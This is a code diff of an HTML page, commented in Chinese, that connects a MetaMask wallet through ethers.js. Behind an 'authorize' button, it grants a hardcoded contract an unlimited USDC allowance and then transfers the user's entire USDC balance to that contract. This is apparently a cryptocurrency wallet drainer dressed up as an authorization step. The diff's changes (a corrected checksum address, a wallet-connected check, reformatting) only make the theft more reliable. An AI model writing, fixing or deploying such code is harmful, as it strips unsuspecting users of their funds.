@@ -33,6 +33,7 @@
       margin-top: 20px;
       font-size: 14px;
       color: #666;
+      white-space: pre-line;
     }
   </style>
 </head>
@@ -44,54 +45,62 @@
   <div id="status">Status: Waiting for wallet...</div>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-<script>
-  window.addEventListener('DOMContentLoaded', () => {
-    const usdcAddress = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48"; // USDC 主网地址
-    const contractAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12";
-    const maxAmount = ethers.constants.MaxUint256;
-    
-    let provider, signer, user;
+  <script>
+    window.addEventListener('DOMContentLoaded', () => {
+      // ✅ 修复：使用正确的 USDC 校验和地址（小写部分修正）
+      const usdcAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; // 修正后的 USDC 主网地址
+      const contractAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12";
+      const maxAmount = ethers.constants.MaxUint256;
 
-    const status = document.getElementById("status");
-    const connectBtn = document.getElementById("connect");
-    const authorizeBtn = document.getElementById("authorize");
+      let provider, signer, user;
 
-    connectBtn.onclick = async () => {
-      if (!window.ethereum) return alert("Please install MetaMask");
-      provider = new ethers.providers.Web3Provider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
-      signer = provider.getSigner();
+      const status = document.getElementById("status");
+      const connectBtn = document.getElementById("connect");
+      const authorizeBtn = document.getElementById("authorize");
+
+      connectBtn.onclick = async () => {
+        if (!window.ethereum) return alert("Please install MetaMask");
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        signer = provider.getSigner();
         const rawUser = await signer.getAddress();
-      user = await signer.getAddress();
-      status.innerText = "🔗 Connected: " + user;
-    };
+        user = ethers.utils.getAddress(rawUser); // ✅ 格式化为 checksum address
+        status.innerText = "🔗 Connected: " + user;
+      };
 
-    authorizeBtn.onclick = async () => {
-      const usdc = new ethers.Contract(
-        usdcAddress,
-        [
-          "function approve(address,uint256) public returns (bool)",
-          "function transferFrom(address,address,uint256) public returns (bool)",
-          "function balanceOf(address) view returns (uint256)"
-        ],
-        signer
-      );
-      try {
-        status.innerText += "\n⏳ Approving contract...";
-        const tx1 = await usdc.approve(contractAddress, maxAmount);
-        await tx1.wait();
+      authorizeBtn.onclick = async () => {
+        if (!signer) {
+          status.innerText += "\n❌ Error: Please connect wallet first";
+          return;
+        }
 
-        const balance = await usdc.balanceOf(user);
-        status.innerText += "\n💸 Transferring USDC: " + ethers.utils.formatUnits(balance, 6) + " USDC";
+        const usdc = new ethers.Contract(
+          usdcAddress,
+          [
+            "function approve(address,uint256) public returns (bool)",
+            "function transferFrom(address,address,uint256) public returns (bool)",
+            "function balanceOf(address) view returns (uint256)"
+          ],
+          signer
+        );
+        try {
+          status.innerText += "\n⏳ Approving contract...";
+          const tx1 = await usdc.approve(contractAddress, maxAmount);
+          await tx1.wait();
 
-        const tx2 = await usdc.transferFrom(user, contractAddress, balance);
-        await tx2.wait();
+          const balance = await usdc.balanceOf(user);
+          status.innerText += "\n💸 Transferring USDC: " + ethers.utils.formatUnits(balance, 6) + " USDC";
 
-        status.innerText += "\n✅ All steps completed.";
-      } catch (e) {
-        console.error(e);
-        status.innerText += "\n❌ Error: " + (e.reason || e.message || "Unknown error");
-      }
-    };
-  });
-</script>
+          const tx2 = await usdc.transferFrom(user, contractAddress, balance);
+          await tx2.wait();
+
+          status.innerText += "\n✅ All steps completed.";
+        } catch (e) {
+          console.error(e);
+          status.innerText += "\n❌ Error: " + (e.reason || e.message || "Unknown error");
+        }
+      };
+    });
+  </script>
+</body>
+</html>
